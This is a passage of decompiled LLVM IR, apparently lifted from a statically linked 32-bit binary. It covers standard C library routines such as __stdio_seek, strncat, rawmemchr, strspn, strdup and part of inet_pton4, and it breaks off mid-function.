  %v1_80534be = inttoptr i32 %v1_80534b9 to i32*
  store i32 9, i32* %v1_80534be, align 4
  br label %dec_label_pc_80534c4

dec_label_pc_80534c4:                             ; preds = %dec_label_pc_80534d1, %dec_label_pc_80534b9
  %v0_80534c4 = load i32, i32* @ebx, align 4
  %v1_80534c4 = inttoptr i32 %v0_80534c4 to i16*
  %v2_80534c4 = load i16, i16* %v1_80534c4, align 2
  %v3_80534c4 = or i16 %v2_80534c4, 8
  store i16 %v3_80534c4, i16* %v1_80534c4, align 2
  br label %dec_label_pc_80534f1

dec_label_pc_80534cd:                             ; preds = %dec_label_pc_80534b2
  %v2_80534cd = and i16 %v2_80534b2, 64
  %v3_80534cd = icmp eq i16 %v2_80534cd, 0
  br i1 %v3_80534cd, label %dec_label_pc_80534eb, label %dec_label_pc_80534d1

dec_label_pc_80534d1:                             ; preds = %dec_label_pc_80534cd
  %v2_80534d5 = call i32 @__stdio_wcommit(i32 %v0_80534d4)
  %v1_80534dd = icmp eq i32 %v2_80534d5, 0
  %v1_80534df = icmp eq i1 %v1_80534dd, false
  br i1 %v1_80534df, label %dec_label_pc_80534c4, label %dec_label_pc_80534e1

dec_label_pc_80534e1:                             ; preds = %dec_label_pc_80534d1
  %v0_80534e1 = load i32, i32* @ebx, align 4
  %v1_80534e1 = inttoptr i32 %v0_80534e1 to i16*
  %v2_80534e1 = load i16, i16* %v1_80534e1, align 2
  %v3_80534e1 = and i16 %v2_80534e1, -65
  store i16 %v3_80534e1, i16* %v1_80534e1, align 2
  %v0_80534e5 = load i32, i32* @ebx, align 4
  %v1_80534e5 = add i32 %v0_80534e5, 8
  %v2_80534e5 = inttoptr i32 %v1_80534e5 to i32*
  %v3_80534e5 = load i32, i32* %v2_80534e5, align 4
  %v2_80534e8 = add i32 %v0_80534e5, 28
  %v3_80534e8 = inttoptr i32 %v2_80534e8 to i32*
  store i32 %v3_80534e5, i32* %v3_80534e8, align 4
  %v0_80534eb.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80534eb

dec_label_pc_80534eb:                             ; preds = %dec_label_pc_80534cd, %dec_label_pc_80534e1
  %v9_80534eb = phi i32 [ %v0_80534d4, %dec_label_pc_80534cd ], [ %v0_80534eb.pre, %dec_label_pc_80534e1 ]
  %v1_80534eb = inttoptr i32 %v9_80534eb to i16*
  %v2_80534eb = load i16, i16* %v1_80534eb, align 2
  %v3_80534eb = or i16 %v2_80534eb, 1
  store i16 %v3_80534eb, i16* %v1_80534eb, align 2
  br label %dec_label_pc_80534f1

dec_label_pc_80534f1:                             ; preds = %dec_label_pc_80534c4, %dec_label_pc_80534eb
  %storemerge = phi i32 [ 0, %dec_label_pc_80534eb ], [ -1, %dec_label_pc_80534c4 ]
  store i32 %v0_8053490, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_805349c, { 1, 2, 0 }
  uselistorder i32 %v0_8053490, { 1, 0 }
  uselistorder i16 1, { 1, 2, 0 }
  uselistorder i32 (i32)* @__stdio_wcommit, { 3, 6, 5, 4, 2, 1, 0 }
  uselistorder i16 8, { 3, 4, 0, 1, 5, 2 }
  uselistorder i16 0, { 0, 7, 1, 8, 5, 6, 9, 10, 11, 12, 13, 14, 15, 2, 3, 4 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80534f1, { 1, 0 }
  uselistorder label %dec_label_pc_80534eb, { 1, 0 }
  uselistorder label %dec_label_pc_80534b2, { 1, 0 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp5 = ptrtoint i32* %arg2 to i32
  store i32 %tmp5, i32* @ebx, align 4
  %v1_8053504 = add i32 %tmp5, 4
  %v2_8053504 = inttoptr i32 %v1_8053504 to i32*
  %v3_8053504 = load i32, i32* %v2_8053504, align 4
  %v2_8053507 = load i32, i32* %arg2, align 4
  %v1_805350d = add i32 %arg1, 4
  %v2_805350d = inttoptr i32 %v1_805350d to i32*
  %v3_805350d = load i32, i32* %v2_805350d, align 4
  %v4_8053510 = call i32 @__libc_lseek64(i32 %v3_805350d, i32 %v2_8053507, i32 %v3_8053504, i32 %arg3)
  %v0_805351a = load i32, i32* @edx, align 4
  %v2_805351a = icmp slt i32 %v0_805351a, 0
  br i1 %v2_805351a, label %dec_label_pc_8053525, label %dec_label_pc_805351e

dec_label_pc_805351e:                             ; preds = %entry
  %v1_805351e = load i32, i32* @ebx, align 4
  %v2_805351e = inttoptr i32 %v1_805351e to i32*
  store i32 %v4_8053510, i32* %v2_805351e, align 4
  %v0_8053520 = load i32, i32* @edx, align 4
  %v1_8053520 = load i32, i32* @ebx, align 4
  %v2_8053520 = add i32 %v1_8053520, 4
  %v3_8053520 = inttoptr i32 %v2_8053520 to i32*
  store i32 %v0_8053520, i32* %v3_8053520, align 4
  br label %dec_label_pc_8053525

dec_label_pc_8053525:                             ; preds = %entry, %dec_label_pc_805351e
  %v0_8053525 = phi i32 [ %v4_8053510, %entry ], [ 0, %dec_label_pc_805351e ]
  ret i32 %v0_8053525

; uselistorder directives
  uselistorder i32 %tmp5, { 1, 0 }
  uselistorder label %dec_label_pc_8053525, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v4_805352e = ptrtoint i8* %arg1 to i32
  %v4_8053536.pre = load i32, i32* @eax, align 4
  %v8_8053536.pre = load i1, i1* @df, align 1
  %v9_8053536 = select i1 %v8_8053536.pre, i32 -1, i32 1
  br label %dec_label_pc_8053536

dec_label_pc_8053536:                             ; preds = %dec_label_pc_805353a, %entry
  %v20_8053537 = phi i32 [ %v23_8053537, %dec_label_pc_805353a ], [ %arg2, %entry ]
  %v4_8053536 = phi i32 [ %v6_8053536, %dec_label_pc_805353a ], [ %v4_8053536.pre, %entry ]
  %v7_8053536 = phi i32 [ %v10_8053536, %dec_label_pc_805353a ], [ %v4_805352e, %entry ]
  %v1_8053536 = inttoptr i32 %v7_8053536 to i8*
  %v2_8053536 = load i8, i8* %v1_8053536, align 1
  %v3_8053537 = inttoptr i32 %v20_8053537 to i8*
  %v4_8053537 = load i8, i8* %v3_8053537, align 1
  %v15_8053537 = icmp eq i8 %v2_8053536, %v4_8053537
  %v1_8053538 = icmp eq i1 %v15_8053537, false
  br i1 %v1_8053538, label %dec_label_pc_8053542, label %dec_label_pc_805353a

dec_label_pc_805353a:                             ; preds = %dec_label_pc_8053536
  %v3_8053536 = zext i8 %v2_8053536 to i32
  %v5_8053536 = and i32 %v4_8053536, -256
  %v6_8053536 = or i32 %v3_8053536, %v5_8053536
  %v23_8053537 = add i32 %v20_8053537, %v9_8053536
  %v10_8053536 = add i32 %v7_8053536, %v9_8053536
  %v4_805353a = icmp eq i8 %v2_8053536, 0
  %v1_805353c = icmp eq i1 %v4_805353a, false
  br i1 %v1_805353c, label %dec_label_pc_8053536, label %dec_label_pc_8053546

dec_label_pc_8053542:                             ; preds = %dec_label_pc_8053536
  br label %dec_label_pc_8053546

dec_label_pc_8053546:                             ; preds = %dec_label_pc_805353a, %dec_label_pc_8053542
  %storemerge = phi i32 [ 1, %dec_label_pc_8053542 ], [ 0, %dec_label_pc_805353a ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_8053536, { 1, 2, 0 }
  uselistorder i32 %v9_8053536, { 1, 0 }
  uselistorder label %dec_label_pc_8053546, { 1, 0 }
}

define i32 @__GI_strncat() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-8 = alloca i32, align 4
  %v0_805354d = load i32, i32* @esi, align 4
  store i32 %v0_805354d, i32* %stack_var_-8, align 4
  %v4_805354e = ptrtoint i8* %tmp5 to i32
  store i32 %v4_805354e, i32* %esi.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v4_805355b = inttoptr i32 %tmp to i8*
  store i32 %tmp, i32* %edi.global-to-local, align 4
  %v3_805355f = call i32 @_strlen(i8* %v4_805355b)
  %v2_8053561 = add i32 %tmp, -1
  store i32 %v2_8053561, i32* %edi.global-to-local, align 4
  %v0_8053562 = load i32, i32* %edx.global-to-local, align 4
  %v8_805356510 = icmp eq i32 %v0_8053562, 0
  store i32 %v0_8053562, i32* %ecx.global-to-local, align 4
  br i1 %v8_805356510, label %dec_label_pc_8053570, label %dec_label_pc_8053568.lr.ph

dec_label_pc_8053568.lr.ph:                       ; preds = %entry
  %v4_8053568.pre = load i32, i32* %eax.global-to-local, align 4
  %v8_8053568.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_8053568

dec_label_pc_8053568:                             ; preds = %dec_label_pc_8053568.lr.ph, %dec_label_pc_8053568.dec_label_pc_8053565_crit_edge
  %v8_8053568 = phi i1 [ %v8_8053568.pre, %dec_label_pc_8053568.lr.ph ], [ %v5_8053569, %dec_label_pc_8053568.dec_label_pc_8053565_crit_edge ]
  %v4_8053568 = phi i32 [ %v4_8053568.pre, %dec_label_pc_8053568.lr.ph ], [ %v0_805356a, %dec_label_pc_8053568.dec_label_pc_8053565_crit_edge ]
  %v2_805357211 = phi i32 [ %v2_8053561, %dec_label_pc_8053568.lr.ph ], [ %v7_8053569, %dec_label_pc_8053568.dec_label_pc_8053565_crit_edge ]
  %v0_8053568 = load i32, i32* %esi.global-to-local, align 4
  %v1_8053568 = inttoptr i32 %v0_8053568 to i8*
  %v2_8053568 = load i8, i8* %v1_8053568, align 1
  %v3_8053568 = zext i8 %v2_8053568 to i32
  %v5_8053568 = and i32 %v4_8053568, -256
  %v6_8053568 = or i32 %v5_8053568, %v3_8053568
  store i32 %v6_8053568, i32* %eax.global-to-local, align 4
  %v9_8053568 = select i1 %v8_8053568, i32 -1, i32 1
  %v10_8053568 = add i32 %v9_8053568, %v0_8053568
  store i32 %v10_8053568, i32* %esi.global-to-local, align 4
  %v3_8053569 = inttoptr i32 %v2_805357211 to i8*
  store i8 %v2_8053568, i8* %v3_8053569, align 1
  %v4_8053569 = load i32, i32* %edi.global-to-local, align 4
  %v5_8053569 = load i1, i1* @df, align 1
  %v6_8053569 = select i1 %v5_8053569, i32 -1, i32 1
  %v7_8053569 = add i32 %v6_8053569, %v4_8053569
  store i32 %v7_8053569, i32* %edi.global-to-local, align 4
  %v0_805356a = load i32, i32* %eax.global-to-local, align 4
  %v3_805356a = trunc i32 %v0_805356a to i8
  %v4_805356a = icmp eq i8 %v3_805356a, 0
  %v1_805356c = icmp eq i1 %v4_805356a, false
  br i1 %v1_805356c, label %dec_label_pc_8053568.dec_label_pc_8053565_crit_edge, label %dec_label_pc_8053573

dec_label_pc_8053568.dec_label_pc_8053565_crit_edge: ; preds = %dec_label_pc_8053568
  %v0_8053565.pre = load i32, i32* %ecx.global-to-local, align 4
  %v1_8053565 = add i32 %v0_8053565.pre, -1
  %v8_8053565 = icmp eq i32 %v1_8053565, 0
  store i32 %v1_8053565, i32* %ecx.global-to-local, align 4
  br i1 %v8_8053565, label %dec_label_pc_8053570, label %dec_label_pc_8053568

dec_label_pc_8053570:                             ; preds = %dec_label_pc_8053568.dec_label_pc_8053565_crit_edge, %entry
  %v2_8053572.lcssa = phi i32 [ %v2_8053561, %entry ], [ %v7_8053569, %dec_label_pc_8053568.dec_label_pc_8053565_crit_edge ]
  store i32 0, i32* %eax.global-to-local, align 4
  %v3_8053572 = inttoptr i32 %v2_8053572.lcssa to i8*
  store i8 0, i8* %v3_8053572, align 1
  %v4_8053572 = load i32, i32* %edi.global-to-local, align 4
  %v5_8053572 = load i1, i1* @df, align 1
  %v6_8053572 = select i1 %v5_8053572, i32 -1, i32 1
  %v7_8053572 = add i32 %v6_8053572, %v4_8053572
  store i32 %v7_8053572, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8053573

dec_label_pc_8053573:                             ; preds = %dec_label_pc_8053568, %dec_label_pc_8053570
  store i32 %tmp, i32* %eax.global-to-local, align 4
  %v2_8053577 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8053577, i32* @esi, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v1_8053565, { 1, 0 }
  uselistorder i32 %v0_805356a, { 1, 0 }
  uselistorder i32 %v7_8053569, { 0, 2, 1 }
  uselistorder i1 %v5_8053569, { 1, 0 }
  uselistorder i32 %tmp, { 4, 3, 0, 1, 2 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32* %ecx.global-to-local, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_8053573, { 1, 0 }
  uselistorder label %dec_label_pc_8053568, { 1, 0 }
}

define i32 @rawmemchr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_805357d = load i32, i32* @ebx, align 4
  %v4_805357e = urem i32 %arg2, 256
  %v4_8053582 = ptrtoint i8* %arg1 to i32
  %v2_805358d3 = urem i32 %v4_8053582, 4
  %v3_805358d4 = icmp eq i32 %v2_805358d3, 0
  %v1_805358f8 = icmp eq i1 %v3_805358d4, false
  %v4_8053588 = trunc i32 %arg2 to i8
  br i1 %v1_805358f8, label %dec_label_pc_8053588, label %dec_label_pc_8053591

dec_label_pc_8053588:                             ; preds = %entry, %dec_label_pc_805358c
  %v0_805358c = phi i32 [ %v1_805358c, %dec_label_pc_805358c ], [ %v4_8053582, %entry ]
  %v1_8053588 = inttoptr i32 %v0_805358c to i8*
  %v2_8053588 = load i8, i8* %v1_8053588, align 1
  %v15_8053588 = icmp eq i8 %v2_8053588, %v4_8053588
  br i1 %v15_8053588, label %dec_label_pc_80535dc, label %dec_label_pc_805358c

dec_label_pc_805358c:                             ; preds = %dec_label_pc_8053588
  %v1_805358c = add i32 %v0_805358c, 1
  %v2_805358d = urem i32 %v1_805358c, 4
  %v3_805358d = icmp eq i32 %v2_805358d, 0
  %v1_805358f = icmp eq i1 %v3_805358d, false
  br i1 %v1_805358f, label %dec_label_pc_8053588, label %dec_label_pc_8053591

dec_label_pc_8053591:                             ; preds = %entry, %dec_label_pc_805358c
  %v0_8053594 = phi i32 [ %v1_805358c, %dec_label_pc_805358c ], [ %v4_8053582, %entry ]
  %v2_8053598 = mul nuw nsw i32 %v4_805357e, 256
  %v2_805359b = or i32 %v2_8053598, %v4_805357e
  %v2_805359f = mul i32 %v2_805359b, 65536
  %v2_80535a2 = or i32 %v2_805359f, %v2_805359b
  br label %dec_label_pc_80535a4

dec_label_pc_80535a4:                             ; preds = %dec_label_pc_80535d4, %dec_label_pc_80535a4, %dec_label_pc_8053591
  %v0_80535a8 = phi i32 [ %v0_8053594, %dec_label_pc_8053591 ], [ %v1_80535a8, %dec_label_pc_80535a4 ], [ %v1_80535a8, %dec_label_pc_80535d4 ]
  %v2_80535a6 = inttoptr i32 %v0_80535a8 to i32*
  %v3_80535a6 = load i32, i32* %v2_80535a6, align 4
  %v4_80535a6 = xor i32 %v3_80535a6, %v2_80535a2
  %v1_80535a8 = add i32 %v0_80535a8, 4
  store i32 %v1_80535a8, i32* @ecx, align 4
  %v1_80535ab = add i32 %v4_80535a6, 2130640639
  %v1_80535b1 = sub i32 -1, %v4_80535a6
  store i32 %v1_80535b1, i32* @edx, align 4
  %v2_80535b3 = xor i32 %v1_80535ab, %v1_80535b1
  %v1_80535b5 = and i32 %v2_80535b3, -2130640640
  %v2_80535b5 = icmp eq i32 %v1_80535b5, 0
  br i1 %v2_80535b5, label %dec_label_pc_80535a4, label %dec_label_pc_80535bc

dec_label_pc_80535bc:                             ; preds = %dec_label_pc_80535a4
  %v2_80535bf = inttoptr i32 %v0_80535a8 to i8*
  %v3_80535bf = load i8, i8* %v2_80535bf, align 1
  %v16_80535bf = icmp eq i8 %v3_80535bf, %v4_8053588
  br i1 %v16_80535bf, label %dec_label_pc_80535dc, label %dec_label_pc_80535c4

dec_label_pc_80535c4:                             ; preds = %dec_label_pc_80535bc
  %v1_80535c4 = add i32 %v0_80535a8, 1
  %v2_80535c7 = inttoptr i32 %v1_80535c4 to i8*
  %v3_80535c7 = load i8, i8* %v2_80535c7, align 1
  %v16_80535c7 = icmp eq i8 %v3_80535c7, %v4_8053588
  br i1 %v16_80535c7, label %dec_label_pc_80535dc, label %dec_label_pc_80535cc

dec_label_pc_80535cc:                             ; preds = %dec_label_pc_80535c4
  %v1_80535cc = add i32 %v0_80535a8, 2
  %v2_80535cf = inttoptr i32 %v1_80535cc to i8*
  %v3_80535cf = load i8, i8* %v2_80535cf, align 1
  %v16_80535cf = icmp eq i8 %v3_80535cf, %v4_8053588
  br i1 %v16_80535cf, label %dec_label_pc_80535dc, label %dec_label_pc_80535d4

dec_label_pc_80535d4:                             ; preds = %dec_label_pc_80535cc
  %v1_80535d4 = add i32 %v0_80535a8, 3
  %v2_80535d7 = inttoptr i32 %v1_80535d4 to i8*
  %v3_80535d7 = load i8, i8* %v2_80535d7, align 1
  %v16_80535d7 = icmp eq i8 %v3_80535d7, %v4_8053588
  %v1_80535da = icmp eq i1 %v16_80535d7, false
  br i1 %v1_80535da, label %dec_label_pc_80535a4, label %dec_label_pc_80535dc

dec_label_pc_80535dc:                             ; preds = %dec_label_pc_8053588, %dec_label_pc_80535d4, %dec_label_pc_80535cc, %dec_label_pc_80535c4, %dec_label_pc_80535bc
  %v0_80535de = phi i32 [ %v1_80535d4, %dec_label_pc_80535d4 ], [ %v1_80535cc, %dec_label_pc_80535cc ], [ %v1_80535c4, %dec_label_pc_80535c4 ], [ %v0_80535a8, %dec_label_pc_80535bc ], [ %v0_805358c, %dec_label_pc_8053588 ]
  store i32 %v0_805357d, i32* @ebx, align 4
  ret i32 %v0_80535de

; uselistorder directives
  uselistorder i32 %v1_80535b1, { 1, 0 }
  uselistorder i32 %v1_80535a8, { 2, 1, 0 }
  uselistorder i32 %v2_805359b, { 1, 0 }
  uselistorder i32 %v1_805358c, { 1, 0, 2 }
  uselistorder i32 %v4_8053582, { 2, 1, 0 }
  uselistorder i32 %v4_805357e, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_80535dc, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_8053591, { 1, 0 }
  uselistorder label %dec_label_pc_8053588, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_805360230 = load i8, i8* %arg1, align 1
  %v4_805360434 = icmp eq i8 %v2_805360230, 0
  br i1 %v4_805360434, label %dec_label_pc_805360c, label %dec_label_pc_8053608.lr.ph

dec_label_pc_8053608.lr.ph:                       ; preds = %entry
  %v3_805360231 = zext i8 %v2_805360230 to i32
  %v4_8053602.pre = load i32, i32* @eax, align 4
  %v5_805360232 = and i32 %v4_8053602.pre, -256
  %v6_805360233 = or i32 %v3_805360231, %v5_805360232
  %v4_80535e9 = ptrtoint i8* %arg1 to i32
  %v1_80535f418 = inttoptr i32 %arg2 to i8*
  %v4_80535f4.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8053608

dec_label_pc_80535ef:                             ; preds = %dec_label_pc_8053608, %dec_label_pc_80535f3
  %v6_80535f427 = phi i32 [ %v6_80535f4, %dec_label_pc_80535f3 ], [ %v6_80535f422, %dec_label_pc_8053608 ]
  %v2_80535f426 = phi i8 [ %v2_80535f4, %dec_label_pc_80535f3 ], [ %v2_80535f419, %dec_label_pc_8053608 ]
  %v0_80535f325 = phi i32 [ %v1_80535f3, %dec_label_pc_80535f3 ], [ %arg2, %dec_label_pc_8053608 ]
  %v15_80535ef = icmp eq i8 %v2_805360237, %v2_80535f426
  br i1 %v15_80535ef, label %dec_label_pc_80535fc, label %dec_label_pc_80535f3

dec_label_pc_80535f3:                             ; preds = %dec_label_pc_80535ef
  %v1_80535f3 = add i32 %v0_80535f325, 1
  store i32 %v1_80535f3, i32* @edx, align 4
  %v1_80535f4 = inttoptr i32 %v1_80535f3 to i8*
  %v2_80535f4 = load i8, i8* %v1_80535f4, align 1
  %v3_80535f4 = zext i8 %v2_80535f4 to i32
  %v5_80535f4 = and i32 %v6_80535f427, -256
  %v6_80535f4 = or i32 %v3_80535f4, %v5_80535f4
  store i32 %v6_80535f4, i32* @ecx, align 4
  %v4_80535f6 = icmp eq i8 %v2_80535f4, 0
  %v1_80535f8 = icmp eq i1 %v4_80535f6, false
  br i1 %v1_80535f8, label %dec_label_pc_80535ef, label %dec_label_pc_805360c

dec_label_pc_80535fc:                             ; preds = %dec_label_pc_80535ef
  %v1_8053600 = add i32 %v0_805360c35, 1
  %v1_8053601 = add i32 %v0_805360136, 1
  %v1_8053602 = inttoptr i32 %v1_8053601 to i8*
  %v2_8053602 = load i8, i8* %v1_8053602, align 1
  %v3_8053602 = zext i8 %v2_8053602 to i32
  %v5_8053602 = and i32 %v6_805360238, -256
  %v6_8053602 = or i32 %v3_8053602, %v5_8053602
  %v4_8053604 = icmp eq i8 %v2_8053602, 0
  br i1 %v4_8053604, label %dec_label_pc_805360c, label %dec_label_pc_8053608

dec_label_pc_8053608:                             ; preds = %dec_label_pc_8053608.lr.ph, %dec_label_pc_80535fc
  %v4_80535f4.pre = phi i32 [ %v4_80535f4.pre.pre, %dec_label_pc_8053608.lr.ph ], [ %v6_80535f427, %dec_label_pc_80535fc ]
  %v6_805360238 = phi i32 [ %v6_805360233, %dec_label_pc_8053608.lr.ph ], [ %v6_8053602, %dec_label_pc_80535fc ]
  %v2_805360237 = phi i8 [ %v2_805360230, %dec_label_pc_8053608.lr.ph ], [ %v2_8053602, %dec_label_pc_80535fc ]
  %v0_805360136 = phi i32 [ %v4_80535e9, %dec_label_pc_8053608.lr.ph ], [ %v1_8053601, %dec_label_pc_80535fc ]
  %v0_805360c35 = phi i32 [ 0, %dec_label_pc_8053608.lr.ph ], [ %v1_8053600, %dec_label_pc_80535fc ]
  store i32 %arg2, i32* @edx, align 4
  %v2_80535f419 = load i8, i8* %v1_80535f418, align 1
  %v3_80535f420 = zext i8 %v2_80535f419 to i32
  %v5_80535f421 = and i32 %v4_80535f4.pre, -256
  %v6_80535f422 = or i32 %v3_80535f420, %v5_80535f421
  store i32 %v6_80535f422, i32* @ecx, align 4
  %v4_80535f623 = icmp eq i8 %v2_80535f419, 0
  %v1_80535f824 = icmp eq i1 %v4_80535f623, false
  br i1 %v1_80535f824, label %dec_label_pc_80535ef, label %dec_label_pc_805360c

dec_label_pc_805360c:                             ; preds = %entry, %dec_label_pc_80535fc, %dec_label_pc_8053608, %dec_label_pc_80535f3
  %v0_805360c17 = phi i32 [ %v0_805360c35, %dec_label_pc_80535f3 ], [ %v0_805360c35, %dec_label_pc_8053608 ], [ 0, %entry ], [ %v1_8053600, %dec_label_pc_80535fc ]
  ret i32 %v0_805360c17

; uselistorder directives
  uselistorder i32 %v6_80535f422, { 1, 0 }
  uselistorder i8 %v2_80535f419, { 1, 2, 0 }
  uselistorder i32 %v1_8053601, { 1, 0 }
  uselistorder i32 %v6_80535f4, { 1, 0 }
  uselistorder i8 %v2_80535f4, { 1, 2, 0 }
  uselistorder i32 %v1_80535f3, { 2, 1, 0 }
  uselistorder i8 %v2_805360230, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805360c, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_8053608, { 1, 0 }
}

define i32 @__GI_strdup(i8* %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8053614 = load i32, i32* @edi, align 4
  %v0_8053615 = load i32, i32* @esi, align 4
  %v0_8053616 = load i32, i32* @ebx, align 4
  store i32 %v0_8053616, i32* %stack_var_-12, align 4
  %v4_8053617 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8053617, i32* @edi, align 4
  %v3_805361f = call i32 @strlen(i8* %arg1)
  %v1_8053624 = add i32 %v3_805361f, 1
  store i32 %v1_8053624, i32* @esi, align 4
  %v2_805362a = call i32 @malloc(i32 %v1_8053624)
  store i32 %v2_805362a, i32* %ebx.global-to-local, align 4
  %v1_8053634 = icmp eq i32 %v2_805362a, 0
  br i1 %v1_8053634, label %dec_label_pc_8053644, label %dec_label_pc_8053638

dec_label_pc_8053638:                             ; preds = %entry
  %v0_8053639 = load i32, i32* @esi, align 4
  %v0_805363a = load i32, i32* @edi, align 4
  %tmp10 = inttoptr i32 %v2_805362a to i16*
  %v6_805363c = call i32 @memcpy(i16* %tmp10, i32 %v0_805363a, i32 %v0_8053639)
  %v0_8053644.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053644

dec_label_pc_8053644:                             ; preds = %entry, %dec_label_pc_8053638
  %v0_8053644 = phi i32 [ 0, %entry ], [ %v0_8053644.pre, %dec_label_pc_8053638 ]
  %v2_8053646 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8053646, i32* @ebx, align 4
  store i32 %v0_8053615, i32* @esi, align 4
  store i32 %v0_8053614, i32* @edi, align 4
  ret i32 %v0_8053644

; uselistorder directives
  uselistorder i32 %v2_805362a, { 0, 2, 1 }
  uselistorder i32 (i32)* @malloc, { 9, 8, 7, 17, 16, 15, 1, 4, 3, 14, 13, 12, 11, 10, 6, 5, 2, 0 }
  uselistorder label %dec_label_pc_8053644, { 1, 0 }
}

define i32 @inet_pton4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_805364e = load i32, i32* @esi, align 4
  %v0_8053655 = load i32, i32* @eax, align 4
  store i32 %v0_8053655, i32* %ebx.global-to-local, align 4
  store i32 0, i32* @edx, align 4
  store i32 0, i32* @edi, align 4
  %v2_805365b = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_805365b, i32* @esi, align 4
  store i32 0, i32* %stack_var_-20, align 4
  %v1_80536a315 = inttoptr i32 %v0_8053655 to i8*
  %v2_80536a316 = load i8, i8* %v1_80536a315, align 1
  %v3_80536a317 = sext i8 %v2_80536a316 to i32
  store i32 %v3_80536a317, i32* @ecx, align 4
  %v1_80536a618 = add i32 %v0_8053655, 1
  store i32 %v1_80536a618, i32* %ebx.global-to-local, align 4
  %v1_80536a719 = icmp eq i8 %v2_80536a316, 0
  %v1_80536a920 = icmp eq i1 %v1_80536a719, false
  br i1 %v1_80536a920, label %dec_label_pc_8053666, label %dec_label_pc_80536ab.thread

dec_label_pc_80536ab.thread:                      ; preds = %entry
  br label %dec_label_pc_80536c8

dec_label_pc_8053666:                             ; preds = %entry, %dec_label_pc_80536a3.backedge
  %v3_80536a322 = phi i32 [ %v3_80536a3, %dec_label_pc_80536a3.backedge ], [ %v3_80536a317, %entry ]
  %v2_80536a321 = phi i8 [ %v2_80536a3, %dec_label_pc_80536a3.backedge ], [ %v2_80536a316, %entry ]
  %v1_8053666 = add nsw i32 %v3_80536a322, -48
  store i32 %v1_8053666, i32* %eax.global-to-local, align 4
  %v6_805366c = icmp ugt i32 %v1_8053666, 9
  br i1 %v6_805366c, label %dec_label_pc_805368f, label %dec_label_pc_805366e

dec_label_pc_805366e:                             ; preds = %dec_label_pc_8053666
  %v0_805366e = load i32, i32* @esi, align 4
  %v1_805366e = inttoptr i32 %v0_805366e to i8*
  %v2_805366e = load i8, i8* %v1_805366e, align 1
  %v2_8053671 = zext i8 %v2_805366e to i32
  %v3_8053671 = mul nuw nsw i32 %v2_8053671, 10
  %v3_8053674 = add nsw i32 %v3_8053671, %v1_8053666
  store i32 %v3_8053674, i32* %eax.global-to-local, align 4
  %v6_805367d = icmp ugt i32 %v3_8053674, 255
  br i1 %v6_805367d, label %dec_label_pc_80536c8, label %dec_label_pc_805367f

dec_label_pc_805367f:                             ; preds = %dec_label_pc_805366e
  %v1_805367f = trunc i32 %v3_8053674 to i8
  store i8 %v1_805367f, i8* %v1_805366e, align 1
  %v0_8053681 = load i32, i32* @edx, align 4
  %v1_8053681 = icmp eq i32 %v0_8053681, 0
  %v1_8053683 = icmp eq i1 %v1_8053681, false
  br i1 %v1_8053683, label %dec_label_pc_80536a3.backedge, label %dec_label_pc_8053685

dec_label_pc_8053685:                             ; preds = %dec_label_pc_805367f
  %v0_8053685 = load i32, i32* @edi, align 4
  %v1_8053685 = add i32 %v0_8053685, 1
  store i32 %v1_8053685, i32* @edi, align 4
  %v1_8053686 = add i32 %v0_8053685, -3
  %v6_8053686 = sub i32 2, %v0_8053685
  %v7_8053686 = and i32 %v6_8053686, %v1_8053685
  %v8_8053686 = icmp slt i32 %v7_8053686, 0
  %v9_8053686 = icmp eq i32 %v1_8053686, 0
  %v10_8053686 = icmp slt i32 %v1_8053686, 0
  %v3_8053689 = icmp eq i1 %v10_8053686, %v8_8053686
  %v4_8053689 = icmp eq i1 %v9_8053686, false
  %v5_8053689 = and i1 %v4_8053689, %v3_8053689
  br i1 %v5_8053689, label %dec_label_pc_80536c8, label %dec_label_pc_805368b

dec_label_pc_805368b:                             ; preds = %dec_label_pc_8053685
  %v1_805368b = and i32 %v0_8053681, -256
  %v2_805368b = or i32 %v1_805368b, 1
  store i32 %v2_805368b, i32* @edx, align 4
  br label %dec_label_pc_80536a3.backedge

dec_label_pc_805368f:                             ; preds = %dec_label_pc_8053666
